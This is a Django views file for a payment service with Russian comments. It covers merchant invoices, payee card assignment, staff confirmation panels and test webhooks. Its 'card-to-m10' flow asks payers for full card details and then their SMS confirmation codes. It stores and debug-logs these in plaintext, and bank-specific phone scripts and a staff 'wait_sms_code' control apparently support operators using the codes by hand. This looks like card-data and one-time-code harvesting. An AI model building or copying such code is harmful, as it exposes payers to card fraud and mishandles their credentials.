import datetime
import json

import random
import uuid
from http import HTTPStatus

import requests
import structlog
from django.contrib.auth.decorators import login_required
from django.contrib.messages.views import SuccessMessageMixin
from django.core.exceptions import PermissionDenied

from django.http import HttpResponse, QueryDict, HttpResponseNotAllowed, HttpResponseForbidden, HttpResponseBadRequest, \
    JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.template.response import TemplateResponse
from django.urls import reverse, reverse_lazy
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt
from django.views.generic import CreateView, DetailView, FormView, UpdateView, ListView, DeleteView

from core.global_func import hash_gen
from deposit.models import Incoming
from payment import forms
from payment.filters import PaymentFilter
from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm, InvoiceM10Form, InvoiceTestForm, \
    MerchantForm
from payment.models import Payment, PayRequisite, Merchant, CreditCard, PhoneScript, Bank
from payment.permissions import AuthorRequiredMixin
from payment.task import send_merch_webhook

logger = structlog.get_logger(__name__)


def menu(request, *args, **kwargs):
    template = 'payment/menu.html'
    user = request.user
    context = {}
    if user.is_authenticated:
        merchants = Merchant.objects.filter(owner=user)
        context = {'merchants': merchants}
    return render(request, template_name=template, context=context)


def get_pay_requisite(pay_type: str) -> PayRequisite:
    """Выдает реквизиты по типу
    [card-to-card]
    [card-to-m10]
    """
    active_requsite = PayRequisite.objects.filter(pay_type=pay_type, is_active=True).all()
    logger.debug(f'active_requsite {pay_type}: {active_requsite}')
    if active_requsite:
        selected_requisite = random.choice(active_requsite)
        logger.debug(f'get_pay_requisite {pay_type}: {selected_requisite.id} из {active_requsite}')
        return selected_requisite


def get_phone_script(card_num) -> PhoneScript:
    """Возвращает скрипт для ввода данных карты/смс по номеру карты"""
    try:
        bin_num = str(card_num)[:6]
        logger.debug(f'bin_num: {bin_num}')
        bank = Bank.objects.filter(bins__contains=[bin_num]).first()

        if not bank:
            bank = Bank.objects.get(name='default')
        logger.info(f'phone_script: {bank.script}')
        return bank.script
    except Exception as err:
        logger.error(err)


def get_time_remaining(pay: Payment) -> tuple[datetime.timedelta, int]:
    TIMER_SECONDS = 300
    TIMER_SMS_SECONDS = 120
    STATUS_WAIT_TIMER = 600
    if pay.card_data and json.loads(f'{pay.card_data}').get('sms_code'):
        time_remaining = pay.cc_data_input_time + datetime.timedelta(seconds=STATUS_WAIT_TIMER) - timezone.now()
        limit = STATUS_WAIT_TIMER
    elif pay.cc_data_input_time:
        time_remaining = pay.cc_data_input_time + datetime.timedelta(seconds=TIMER_SMS_SECONDS) - timezone.now()
        limit = TIMER_SMS_SECONDS
    else:
        time_remaining = pay.create_at + datetime.timedelta(seconds=TIMER_SECONDS) - timezone.now()
        limit = TIMER_SECONDS

    logger.debug(pay.cc_data_input_time)
    logger.debug(time_remaining)
    return time_remaining, limit


def get_time_remaining_data(pay: Payment) -> dict:
    logger.debug('get_time_remaining_data')
    time_remaining, limit = get_time_remaining(pay)
    if time_remaining.total_seconds() > 0:
        hours = time_remaining.seconds // 3600
        minutes = (time_remaining.seconds % 3600) // 60
        seconds = time_remaining.seconds % 60

        data = {
            'name': 'Время до оплаты',
            'hours': hours,
            'minutes': minutes,
            'seconds': seconds,
            'total_seconds': int(time_remaining.total_seconds()),
            'limit': limit,
            'time_passed': int(limit - time_remaining.total_seconds())
        }
    else:
        data = {
            'name': "Время до оплаты",
            'hours': 0,
            'minutes': 0,
            'seconds': 0,
            'total_seconds': 0,
            'limit': 0,
            'time_passed': 0

        }
    return data


def invoice(request, *args, **kwargs):
    """Создание платежа со статусом 0 и прикрепление реквизитов

    Parameters
    ----------
    args
        merchant_id: id платежной системы
        order_id: внешний идентификатор
        user_id
        amount: сумма платежа
        pay_type: тип платежа
    Returns
    -------
    """
    if request.method == 'GET':
        merchant_id = request.GET.get('merchant_id')
        order_id = request.GET.get('order_id')
        user_login = request.GET.get('user_login')
        owner_name = request.GET.get('owner_name')
        amount = request.GET.get('amount') or None
        pay_type = request.GET.get('pay_type')
        signature = request.GET.get('signature')
        query_params = request.GET.urlencode()
        logger.debug(f'GET {args} {kwargs} {request.GET.dict()}'
                     f' {request.META.get("HTTP_REFERER")}')
        required_values = [merchant_id, order_id, pay_type]
        #Проверка сигнатуры
        try:
            merch = Merchant.objects.get(pk=merchant_id)
            string_value = f'{merchant_id}{order_id}'
            merch_hash = hash_gen(string_value, merch.secret)
            assert signature == merch_hash

        except Exception as err:
            logger.warning(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Wrong signature',
                                          content='Wrong signature')

        # Проверяем наличие всех данных для создания платежа
        if not all(required_values):
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not enough info for create pay',
                                              content='Not enough info for create pay')
        logger.debug('Key ok')

        try:
            payment, status = Payment.objects.get_or_create(
                merchant_id=merchant_id,
                order_id=order_id,
                user_login=user_login,
                amount=amount,
                owner_name=owner_name,
            )
            logger.debug(f'payment, status: {payment} {status}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data'
                                          )

        # Сохраняем реквизит к платежу
        if not payment.pay_requisite:
            requisite = get_pay_requisite(pay_type)
            # Если нет активных реквизитов
            if not requisite:
                # Перенаправляем на извинения
                return redirect(reverse('payment:payment_type_not_worked'))
            payment.pay_requisite = requisite
            payment.save()

        if pay_type == 'card-to-card':
            return redirect(reverse('payment:pay_to_card_create') + f'?payment_id={payment.id}')
        elif pay_type == 'card-to-m10':
            return redirect(reverse('payment:pay_to_m10_create') + f'?payment_id={payment.id}')

    logger.warning('Необработанный путь')
    return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                  content='Not correct data'
                                  )


def pay_to_card_create(request, *args, **kwargs):
    """Создание платежа со стотусом 0 и идентификатором

    Parameters
    ----------
    args
        merchant_id: id платежной системы
        order_id: внешний идентификатор
        user_id
        amount: сумма платежа
        pay_type: тип платежа
    Returns
    -------
    """

    if request.method == 'GET':
        merchant_id = request.GET.get('merchant_id')
        order_id = request.GET.get('order_id')
        user_login = request.GET.get('user_login')
        amount = request.GET.get('amount')
        pay_type = request.GET.get('pay_type')
        logger.debug(f'GET {request.GET.dict()} {merchant_id} {order_id} {user_login} {amount} {pay_type}'
                     f' {request.META.get("HTTP_REFERER")}')
        required_key = ['merchant_id', 'order_id', 'user_login', 'amount', 'pay_type']
        # Проверяем наличие всех данных для создания платежа
        for key in required_key:
            if key not in request.GET:
                return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not enough info for create pay',
                                              content='Not enough info for create pay')
        logger.debug('Key ok')
        try:
            payment, status = Payment.objects.get_or_create(
                merchant_id=merchant_id,
                order_id=order_id,
                user_login=user_login,
                amount=amount,
                pay_type=pay_type
            )
            logger.debug(f'payment, status: {payment} {status}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data'
                                          )
        if payment.status > 0 or payment.status == -1:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))

        requisite = get_pay_requisite(pay_type)
        # Если нет активных реквизитов
        if not requisite:
            # Перенаправляем на извинения
            return redirect(reverse('payment:payment_type_not_worked'))

        # Сохраняем реквизит к платежу
        if not payment.pay_requisite:
            payment.pay_requisite = requisite
            payment.save()

        form = forms.InvoiceForm(instance=payment, )
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
        return render(request, context=context, template_name='payment/invoice_card.html')

    elif request.method == 'POST':
        # Обработка нажатия кнопки
        order_id = request.POST.get('order_id')
        amount = request.POST.get('amount')
        payment, status = Payment.objects.get_or_create(order_id=order_id, amount=amount)
        logger.debug(f': {payment} s: {status}')
        form = InvoiceForm(request.POST or None, instance=payment, files=request.FILES or None)
        if form.is_valid():
            # Сохраняем данные и скриншот, меняем статус
            logger.debug('form_save')
            payment.status = 1
            form.save()
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
        else:
            logger.debug(f'{form.errors}')
            context = {'form': form, 'payment': payment, 'status': payment.PAYMENT_STATUS[payment.status]}
            return render(request, context=context, template_name='payment/invoice_card.html')
    logger.critical('Необработанный путь')


def pay_to_m10_create(request, *args, **kwargs):
    """Платеж через ввод реквизитов карты"""
    print('pay_to_m10_create')
    if request.method == 'GET':
        payment_id = request.GET.get('payment_id')
        logger.debug(f'GET {request.GET.dict()}'
                     f' {request.META.get("HTTP_REFERER")}')

        try:
            payment = Payment.objects.get(id=payment_id)
            logger.debug(f'payment, status: {payment}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data')
        if payment.status not in [0, 3]:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))

        amount = payment.amount
        initial_data = {'payment_id': payment.id, 'amount': amount}
        if payment.card_data:
            initial_data.update(json.loads(payment.card_data))
        form = forms.InvoiceM10Form(initial=initial_data)
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
        card_number = initial_data.get('card_number')
        if card_number:
            phone_script = get_phone_script(card_number)
            context['phone_script'] = phone_script
        return render(request, context=context, template_name='payment/invoice_m10.html')

    elif request.method == 'POST':
        # Обработка нажатия кнопки
        payment_id = request.POST.get('payment_id')
        payment = Payment.objects.get(pk=payment_id)
        initial_data = {'payment_id': payment.id}
        form = InvoiceM10Form(request.POST, instance=payment, initial=initial_data)
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}

        if form.is_valid():
            card_data = form.cleaned_data
            logger.debug(card_data)
            card_number = card_data.get('card_number')
            amount = card_data.get('amount')
            phone_script = get_phone_script(card_number)
            context['phone_script'] = phone_script
            sms_code = card_data.get('sms_code')
            payment.card_data = json.dumps(card_data, ensure_ascii=False)
            payment.phone_script_data = phone_script.data_json()
            if not payment.cc_data_input_time:
                payment.cc_data_input_time = timezone.now()
                payment.save()
                context['data'] = get_time_remaining_data(payment)
            # Если ввел смс-код или status 3 и смс код не требуется
            if sms_code or (payment.status == 3 and not phone_script.step_2_required):
                # payment.status = 7  # Ожидание подтверждения
                payment.save()
                return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
            # Введены данные карты
            payment.amount = amount
            if payment.status == 0:
                payment.status = 3  # Ввел CC.
            payment.save()
            return render(request, context=context, template_name='payment/invoice_m10.html')
        else:
            # Некорректные данные
            logger.debug(f'{form.errors}')
            return render(request, context=context, template_name='payment/invoice_m10.html')

    logger.critical('Необработанный путь')


class PayResultView(DetailView):
    form_class = InvoiceForm
    template_name = 'payment/pay_result.html'
    model = Payment

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['status'] = self.object.status_str
        data = get_time_remaining_data(self.object)
        data['name'] = 'Время до подтверждения'
        context['data'] = data
        return context


class PaymentListView(ListView):
    """Спиок заявок"""
    template_name = 'payment/payment_list.html'
    model = Payment
    fields = ('confirmed_amount',
              'confirmed_incoming')
    filter = PaymentFilter

    # def get(self, request, *args, **kwargs):
    #     logger.debug('get form', request=request, args=args, kwargs=kwargs)
    #     self.object = Payment.objects.first()
    #     return super().get(request, *args, **kwargs)
    #
    def get_queryset(self):
        if not self.request.user.is_staff:
            raise PermissionDenied('Недостаточно прав')
        super(PaymentListView, self).get_queryset()

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        form = PaymentListConfirmForm()
        context['form'] = form
        filter = PaymentFilter(self.request.GET, queryset=Payment.objects.all())
        context['filter'] = filter
        return context

    def post(self, request, *args, **kwargs):
        logger.debug('Обработка нажатия кнопки списка заявок')
        logger.info(request.POST.keys())
        logger.info(request.POST.dict())

        payment_id = confirmed_amount = confirmed_incoming_id = None
        for key in request.POST.keys():
            if 'cancel_payment' in request.POST.keys():
                payment_id = request.POST['cancel_payment']
                # Отклонение заявки
                payment = Payment.objects.get(pk=payment_id)
                payment.status = -1
                payment.save()
                return redirect(reverse('payment:payment_list'))

            if 'wait_sms_code' in request.POST.keys():
                payment_id = request.POST['wait_sms_code']
                # Готовность приема кода
                payment = Payment.objects.get(pk=payment_id)
                payment.status = -1
                payment.save()
                return redirect(reverse('payment:payment_list'))

            if key.startswith('payment_id:'):
                payment_id = key.split('payment_id:')[-1]
            if key.startswith('confirm_amount_value:'):
                confirmed_amount = request.POST[key]
                if confirmed_amount:
                    confirmed_amount = int(confirmed_amount)
            if key.startswith('confirmed_incoming_id_value:'):
                confirmed_incoming_id = request.POST[key]
                if confirmed_incoming_id:
                    confirmed_incoming_id = int(confirmed_incoming_id)
        logger.debug('Получили:',
                     payment_id=payment_id,
                     confirmed_amount=confirmed_amount,
                     confirmed_incoming_id=confirmed_incoming_id)
        payment = Payment.objects.get(pk=payment_id)
        logger.debug(payment)
        form = PaymentListConfirmForm(instance=payment,
                                      data={'confirmed_amount': confirmed_amount,
                                            'confirmed_incoming': confirmed_incoming_id
                                            })
        if form.is_valid():
            # Логика подтверждения заявки
            logger.debug(f'valid {form.cleaned_data}')
            payment.status = 9
            payment.confirmed_time = timezone.now()

            if confirmed_incoming_id:
                incoming = Incoming.objects.get(pk=confirmed_incoming_id)
                incoming.confirmed_payment = payment
                incoming.save()
            form.save()
        else:
            return HttpResponseBadRequest(str(form.errors))
        return redirect(reverse('payment:payment_list'))


class PaymentEdit(UpdateView, ):
    # Подробно о payment
    model = Payment
    form_class = PaymentForm
    success_url = reverse_lazy('payment:payment_list')
    template_name = 'payment/payment_edit.html'

    def get(self, request, *args, **kwargs):
        if not self.request.user.is_staff:
            raise PermissionDenied('Недостаточно прав')
        self.object = self.get_object()
        return super().get(request, *args, **kwargs)

    def post(self, request, *args, **kwargs):
        if request.user.has_perm('deposit.can_hand_edit'):
            self.object = self.get_object()
            return super().post(request, *args, **kwargs)
        return HttpResponseForbidden('У вас нет прав делать ручную корректировку')

    def get_context_data(self, **kwargs):
        context = super(PaymentEdit, self).get_context_data(**kwargs)
        # history = self.object.history.order_by('-id').all()
        # context['history'] = history
        return context

    def form_valid(self, form):
        if form.is_valid():
            # old_incoming = Payment.objects.get(pk=self.object.id)
            # payment: Payment = self.object
            # payment.birpay_edit_time = datetime.datetime.now(tz=pytz.timezone(settings.TIME_ZONE))
            # if not incoming.birpay_confirm_time:
            #     incoming.birpay_confirm_time = datetime.datetime.now(tz=pytz.timezone(settings.TIME_ZONE))
            # payment.save()

            # Сохраняем историю
            # IncomingChange().save_incoming_history(old_incoming, incoming, self.request.user)

            return super(PaymentEdit, self).form_valid(form)


def get_bank_from_bin(bin_num) -> Bank:
    bank = Bank.objects.filter(bins__contains=[bin_num]).first()
    if not bank:
        bank = Bank.objects.filter(name='default').first()
    return bank


def get_bank(request, bin_num):
    bin_num = int(bin_num.replace(' ', ''))
    bank = get_bank_from_bin(bin_num)
    data = {'image': bank.image.name}
    return JsonResponse(data, safe=False)


def payment_type_not_worked(request, *args, **kwargs):
    return render(request, template_name='payment/payment_type_not_worked.html')


def test(request, pk, *args, **kwargs):
    pay = get_object_or_404(Payment, pk=pk)
    pay.status = 2
    pay.save()
    return redirect(reverse('payment:pay_result', kwargs={'pk': pay.id}))


def invoice_test(request, *args, **kwargs):
    http_host = request.META['HTTP_HOST']
    print(http_host)
    new_uid = uuid.uuid4()
    form = InvoiceTestForm(initial={'order_id': new_uid})

    if request.method == 'POST':
        print('post')
        request_dict = request.POST.dict()
        request_dict.pop('csrfmiddlewaretoken')
        x = [f'{k}={v}' for k, v in request_dict.items()]
        merch = Merchant.objects.get(pk=request_dict['merchant_id'])
        string_value = f'{request_dict["merchant_id"]}{request_dict["order_id"]}'
        signature = hash_gen(string_value, merch.secret)
        return redirect(reverse('payment:pay_check') + '?' + '&'.join(x) + '&pay_type=card-to-m10' + f'&signature={signature}')

    return render(request,
                  template_name='payment/test_send.html',
                  context={'host': http_host, 'uid': uuid.uuid4(), 'form': form})

def java(request):
    pay: Payment = Payment.objects.first()  # Retrieve the first pay object
    data = get_time_remaining_data(pay)
    return render(request, 'payment/jaya.html', {'data': data})


def send_request(request, *args, **kwargs):
    http_host = request.META.get('HTTP_HOST')

    CONTENT_LENGTH = request.META.get('CONTENT_LENGTH')
    CONTENT_TYPE = request.META.get('CONTENT_TYPE')
    HTTP_ACCEPT = request.META.get('HTTP_ACCEPT')
    HTTP_ACCEPT_ENCODING = request.META.get('HTTP_ACCEPT_ENCODING')
    HTTP_ACCEPT_LANGUAGE = request.META.get('HTTP_ACCEPT_LANGUAGE')
    HTTP_HOST = request.META.get('HTTP_HOST')
    HTTP_REFERER = request.META.get('HTTP_REFERER')
    HTTP_USER_AGENT = request.META.get('HTTP_USER_AGENT')
    QUERY_STRING = request.META.get('QUERY_STRING')
    REMOTE_ADDR = request.META.get('REMOTE_ADDR')
    REMOTE_HOST = request.META.get('REMOTE_HOST')
    REMOTE_USER = request.META.get('REMOTE_USER')
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    REQUEST_METHOD = request.META.get('REQUEST_METHOD')
    SERVER_NAME = request.META.get('SERVER_NAME')
    SERVER_PORT = request.META.get('SERVER_PORT')
    logger.info(f'CONTENT_LENGTH: {CONTENT_LENGTH}')
    logger.info(f'CONTENT_TYPE: {CONTENT_TYPE}')
    logger.info(f'HTTP_ACCEPT: {HTTP_ACCEPT}')
    logger.info(f'HTTP_ACCEPT_ENCODING: {HTTP_ACCEPT_ENCODING}')
    logger.info(f'HTTP_ACCEPT_LANGUAGE: {HTTP_ACCEPT_LANGUAGE}')
    logger.info(f'HTTP_HOST: {HTTP_HOST}')
    logger.info(f'HTTP_REFERER: {HTTP_REFERER}')
    logger.info(f'HTTP_USER_AGENT: {HTTP_USER_AGENT}')
    logger.info(f'QUERY_STRING: {QUERY_STRING}')
    logger.info(f'REMOTE_ADDR: {REMOTE_ADDR}')
    logger.info(f'REMOTE_HOST: {REMOTE_HOST}')
    logger.info(f'REMOTE_USER: {REMOTE_USER}')
    logger.info(f'x_forwarded_for: {x_forwarded_for}')
    logger.info(f'REQUEST_METHOD: {REQUEST_METHOD}')
    logger.info(f'SERVER_NAME: {SERVER_NAME}')
    logger.info(f'SERVER_PORT: {SERVER_PORT}')

    context = {'http_host': request.META['HTTP_HOST']}
    logger.debug(http_host)
    merchant: Merchant = Merchant.objects.get(pk=1)
    print('--------------')
    # url = 'http://45.67.228.39/receive_request/'
    # url = 'http://127.0.0.1:8000/receive_request/'
    url = 'http://asu-payme.com/receive_request/'
    logger.info(request)
    logger.info(f'Requests to url: {url}')
    try:
        # result = requests.get(url, data={'aaa': 'bbb'})
        result = requests.post(url, headers={'Referer': 'xxx.com'}, data={'aaa': 'bbb'})
        logger.info(result.status_code)
    except Exception as err:
        logger.error(err)


    return render(request,
                  template_name='payment/test_send.html',
                  context=context
                  )

@csrf_exempt
def receive_request(request, *args, **kwargs):
    logger.info(f'receive_request: {request}', args=args, kwargs=kwargs)
    CONTENT_LENGTH = request.META.get('CONTENT_LENGTH')
    CONTENT_TYPE = request.META.get('CONTENT_TYPE')
    HTTP_ACCEPT = request.META.get('HTTP_ACCEPT')
    HTTP_ACCEPT_ENCODING = request.META.get('HTTP_ACCEPT_ENCODING')
    HTTP_ACCEPT_LANGUAGE = request.META.get('HTTP_ACCEPT_LANGUAGE')
    HTTP_HOST = request.META.get('HTTP_HOST')
    HTTP_REFERER = request.META.get('HTTP_REFERER')
    HTTP_USER_AGENT = request.META.get('HTTP_USER_AGENT')
    QUERY_STRING = request.META.get('QUERY_STRING')
    REMOTE_ADDR = request.META.get('REMOTE_ADDR')
    REMOTE_HOST = request.META.get('REMOTE_HOST')
    REMOTE_USER = request.META.get('REMOTE_USER')
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    REQUEST_METHOD = request.META.get('REQUEST_METHOD')
    SERVER_NAME = request.META.get('SERVER_NAME')
    SERVER_PORT = request.META.get('SERVER_PORT')
    logger.info(f'CONTENT_LENGTH: {CONTENT_LENGTH}')
    logger.info(f'CONTENT_TYPE: {CONTENT_TYPE}')
    logger.info(f'HTTP_ACCEPT: {HTTP_ACCEPT}')
    logger.info(f'HTTP_ACCEPT_ENCODING: {HTTP_ACCEPT_ENCODING}')
    logger.info(f'HTTP_ACCEPT_LANGUAGE: {HTTP_ACCEPT_LANGUAGE}')
    logger.info(f'HTTP_HOST: {HTTP_HOST}')
    logger.info(f'HTTP_REFERER: {HTTP_REFERER}')
    logger.info(f'HTTP_USER_AGENT: {HTTP_USER_AGENT}')
    logger.info(f'QUERY_STRING: {QUERY_STRING}')
    logger.info(f'REMOTE_ADDR: {REMOTE_ADDR}')
    logger.info(f'REMOTE_HOST: {REMOTE_HOST}')
    logger.info(f'REMOTE_USER: {REMOTE_USER}')
    logger.info(f'x_forwarded_for: {x_forwarded_for}')
    logger.info(f'REQUEST_METHOD: {REQUEST_METHOD}')
    logger.info(f'SERVER_NAME: {SERVER_NAME}')
    logger.info(f'SERVER_PORT: {SERVER_PORT}')
    logger.info(f'request.GET.dict: {request.GET.dict()}')
    logger.info(f'request.POST.dict: {request.POST.dict()}')
    logger.info(f'data: {request.content_type}')
    data = request.body
    print(json.loads(data))
    return HttpResponse(status=HTTPStatus.OK)


class MerchantCreate(CreateView):
    form_class = MerchantForm
    template_name = 'payment/merchant.html'
    success_url = reverse_lazy('payment:menu')

    def form_valid(self, form):
        if form.is_valid():
            form.instance.owner = self.request.user
            form.save()
        return super().form_valid(form)


class MerchantOrders(ListView):
    template_name = 'payment/merchant_orders.html'
    model = Payment
    filter = PaymentFilter
    context_object_name = 'payments'

    def get_queryset(self):
        user = self.request.user
        payments = Payment.objects.filter(merchant__owner=user)
        return payments

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        form = PaymentListConfirmForm()
        context['form'] = form
        filter = PaymentFilter(self.request.GET, queryset=Payment.objects.all())
        context['filter'] = filter
        return context


class MerchantDetail(AuthorRequiredMixin, DetailView, UpdateView,):
    template_name = 'payment/merchant.html'
    model = Merchant
    form = MerchantForm
    success_url = reverse_lazy('payment:menu')
    fields = ('name', 'host', 'pay_success_endpoint', 'secret')


class MerchantDelete(AuthorRequiredMixin, SuccessMessageMixin, DeleteView):
    template_name = 'payment/merchant_confirm_delete.html'
    success_url = reverse_lazy('payment:menu')
    model = Merchant
    success_message = 'Delete complete'


def merchant_test_webhook(request, *args, **kwargs):
    print(request.POST)
    print(args, kwargs)
    order_id = str(uuid.uuid4())
    pk = str(uuid.uuid4())
    merchant_id = request.POST.get('decline') or request.POST.get('accept')
    merchant = Merchant.objects.get(pk=merchant_id)
    payment = Payment(merchant=merchant,
                      id=pk,
                      order_id=order_id,
                      amount=random.randrange(10, 3000),
                      create_at=(datetime.datetime.now() - datetime.timedelta(minutes=1)),
                      )
    if 'decline' in request.POST:
        payment.status = -1
        data = payment.webhook_data()
    else:
        payment.confirmed_amount = random.randrange(10, 3000)
        payment.status = 9
        payment.confirmed_time = datetime.datetime.now()
        data = payment.webhook_data()
    send_merch_webhook.delay(merchant.host, data)
    return JsonResponse(json.dumps(data), safe=False)
